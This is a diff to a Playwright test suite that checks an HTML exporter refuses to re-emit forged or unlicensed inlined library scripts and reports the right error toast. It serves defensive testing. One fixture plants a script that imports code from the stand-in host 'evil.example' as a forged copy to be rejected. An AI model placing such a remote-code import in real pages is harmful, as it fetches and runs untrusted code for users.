@@ -1170,7 +1170,9 @@ test("CMH-OFFLINE-07: a forged inlined-library marker is never re-emitted as exe
   // this exporter wrote it. Each forgery below defeats exactly ONE provenance gate, so the export
   // falls through to the same loud failure a payload-less rich document has always produced
   // (CMH-SIZE-01) instead of promoting the forged bytes into a running script. Every case keeps the
-  // OTHER gates satisfied, so each one is discriminating on its own gate.
+  // OTHER gates satisfied, so each one is discriminating on its own gate. The trailing LICENSING
+  // case is not a gate: its copy passes all four, so it fails with its own specific message
+  // (`toast`) naming the missing notice and the action, not the generic missing-bundle one.
   const forgeries = [
     {
       name: "gate 1: a marker outside the head is not captured",
@@ -1216,13 +1218,57 @@ test("CMH-OFFLINE-07: a forged inlined-library marker is never re-emitted as exe
       name: "licensing: a library with no MIT notice beside it is not redistributed",
       head: '<script data-cmh-offline-lib="mermaid">/* cmh-forged-unlicensed */ window.__forged = 5;</script>',
       body: "",
+      // The bundle is right there in the file, so the generic missing-bundle message would be
+      // misleading: only the licence blocks the re-emission, and the fix is a different action.
+      toast: /inlined mermaid library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
+      // The long actionable message must outlive the 3s confirmation-toast default, or the sentence
+      // that says what to do is gone before it can be read.
+      stillShownAfterMs: 5000,
+    },
+    {
+      name: "licensing: a copy rejected by a gate is not reported as merely unlicensed",
+      // Two marked copies: the first carries a valid notice but fails gate 3, the second passes
+      // every gate but has no notice. Licensing was NOT the sole blocker, so naming it would send
+      // the user after a licence when a copy was actually refused as unsafe.
+      head: FORGED_NOTICE
+        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-rejected-egress */ import("https://evil.example/x.js").catch(function () {});</script>'
+        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-then-unlicensed */ window.__forged = 6;</script>',
+      body: "",
+    },
+    {
+      name: "licensing: an unlicensed copy of another library does not mask this one's failure",
+      // The flags are per library, so a notice-less Chart.js marker must not make the mermaid this
+      // document actually needs report a licensing cause it does not have.
+      head: '<script data-cmh-offline-lib="chartjs">/* cmh-forged-other-lib */ window.__forged = 7;</script>',
+      body: "",
+      toast: /missing the vendored mermaid bundle/i,
+    },
+    {
+      name: "licensing: a marker outside the head is not a candidate, so it does not mask the licence",
+      // Gate 1 is the LOCATION filter that decides what a candidate IS - the exporter only ever
+      // appends to <head> - so a body-placed marker is authored content, not a copy this exporter
+      // refused. It must NOT downgrade the message: the head copy is the only candidate, and
+      // licensing genuinely is the only thing blocking it.
+      body: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-body-marker */ window.__forged = 10;</script>',
+      head: '<script data-cmh-offline-lib="mermaid">/* cmh-head-unlicensed */ window.__forged = 11;</script>',
+      toast: /inlined mermaid library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
+    },
+    {
+      name: "licensing: the error names the library it could not re-emit, not the other one",
+      // This document needs BOTH libraries and neither inlined copy is licensed. Chart.js is
+      // resolved first, so its name - not mermaid's - must be the one in the message.
+      content: FORGERY_CONTENT + '\n<figure class="chart"><canvas id="forge-chart"></canvas></figure>',
+      head: '<script data-cmh-offline-lib="chartjs">/* cmh-forged-both-a */ window.__forged = 8;</script>'
+        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-both-b */ window.__forged = 9;</script>',
+      body: "",
+      toast: /inlined Chart\.js library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
     },
   ];
 
   // Registered ONCE: a per-iteration route would stack a handler per case on the shared page.
   await page.route(/^https?:\/\//, (route) => route.abort());
   for (const forgery of forgeries) {
-    const staged = stageContent(FORGERY_CONTENT + forgery.body, { key: "cmh-offline-forge", source: "offline-forge.html" });
+    const staged = stageContent((forgery.content || FORGERY_CONTENT) + forgery.body, { key: "cmh-offline-forge", source: "offline-forge.html" });
     const downloads = [];
     const onDownload = (d) => downloads.push(d);
     try {
@@ -1238,7 +1284,17 @@ test("CMH-OFFLINE-07: a forged inlined-library marker is never re-emitted as exe
       await page.locator("#btnExportOfflineTop").click();
 
       const toast = page.locator("#toast");
-      await expect(toast, forgery.name).toContainText(/missing the vendored/i, { timeout: 15000 });
+      await expect(toast, forgery.name).toContainText(forgery.toast || /missing the vendored/i, { timeout: 15000 });
+      // An export failure must still be ON SCREEN when it is read, and be announced assertively.
+      // `toContainText` matches the element's text even after the toast has faded, and the toast is
+      // hidden by OPACITY (so Playwright's `toBeVisible` is a tautology here) - the `show` class is
+      // the only thing that discriminates a live toast from a faded one.
+      await expect(toast, forgery.name).toHaveClass(/\bshow\b/);
+      await expect(toast, forgery.name).toHaveAttribute("role", "alert");
+      if (forgery.stillShownAfterMs) {
+        await page.waitForTimeout(forgery.stillShownAfterMs);
+        await expect(toast, forgery.name).toHaveClass(/\bshow\b/);
+      }
       expect(downloads, forgery.name).toHaveLength(0);
     } finally {
       page.off("download", onDownload);
@@ -1251,15 +1307,17 @@ test("CMH-OFFLINE-07: the last qualifying inlined library wins over one planted 
   test.setTimeout(90000);
   // This exporter appends the library as the head's LAST child, so a qualifying copy planted
   // earlier must never displace the genuine one - that would "succeed" with a diagram that never
-  // renders. Both copies below satisfy every provenance gate, so only the ordering rule separates
-  // them.
+  // renders. The two notice-carrying copies below satisfy every provenance gate, so only the
+  // ordering rule separates them; the leading notice-less copy also pins that an unlicensed capture
+  // does not poison the winning one (it must neither be emitted nor displace the genuine copy).
   const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-lastwins", source: "offline-lastwins.html" });
   try {
+    const unlicensed = '<script data-cmh-offline-lib="mermaid">/* cmh-planted-unlicensed */ window.__unlicensed = 1;</script>';
     const decoy = FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-early */ window.__early = 1;</script>';
     const genuine = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nGENUINE LICENSE TEXT\n-->"
       + '\n<script data-cmh-offline-lib="mermaid">/* cmh-genuine-late */ window.__late = 1;</script>';
     const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
-      .replace("</head>", decoy + "\n" + genuine + "\n</head>");
+      .replace("</head>", unlicensed + "\n" + decoy + "\n" + genuine + "\n</head>");
     fs.writeFileSync(staged.html, html);
 
     await page.route(/^https?:\/\//, (route) => route.abort());
@@ -1275,6 +1333,7 @@ test("CMH-OFFLINE-07: the last qualifying inlined library wins over one planted 
 
     expect(exportedHtml, "the last qualifying copy travels").toContain("cmh-genuine-late");
     expect(exportedHtml, "the earlier planted copy does not").not.toContain("cmh-planted-early");
+    expect(exportedHtml, "the notice-less copy does not").not.toContain("cmh-planted-unlicensed");
     expect(exportedHtml).toContain("GENUINE LICENSE TEXT");
     expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
     // Still exactly one of each, so ordering did not turn into duplication.
